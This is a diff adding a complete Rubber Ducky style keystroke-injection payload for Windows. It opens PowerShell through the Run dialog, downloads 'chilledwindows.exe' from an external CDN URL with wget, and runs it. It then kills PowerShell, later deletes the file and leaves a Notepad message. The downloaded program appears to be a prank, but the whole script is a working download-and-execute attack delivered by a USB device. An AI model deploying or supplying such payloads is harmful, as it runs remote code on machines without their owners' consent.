@@ -1,0 +1,46 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 500
+STRING cd C:/
+ENTER
+STRING mkdir temp
+ENTER
+STRING cd C:/temp
+ENTER
+DELAY 500
+STRING mkdir chilledwindows
+ENTER
+DELAY 500
+STRING cd C:/temp/chilledwindows
+ENTER
+DELAY 500
+STRING wget "https://cdn-files.gamejolt.net/hyyqlV1Rad9RuewarW2dkQ==,1655064036/data/games/9/156/581156/files/601432dab0687/chilledwindows.exe" -outfile "chilledwindows.exe"
+ENTER
+DELAY 500
+STRING START chilledwindows.exe 
+ENTER
+STRING taskkill /f /im powershell.exe
+ENTER
+DELAY 15000
+GUI r
+DELAY 500
+STRING powershell.exe
+DELAY 500
+ENTER
+DELAY 500
+STRING cd C:/temp/chilledwindows
+ENTER
+DELAY 500
+STRING del chilledwindows.exe
+ENTER
+DELAY 500
+STRING cd C:/temp
+ENTER
+DELAY 500
+STRING notepad
+ENTER
+DELAY 500
+STRING you must now manually delete /chilledwindows/ dir
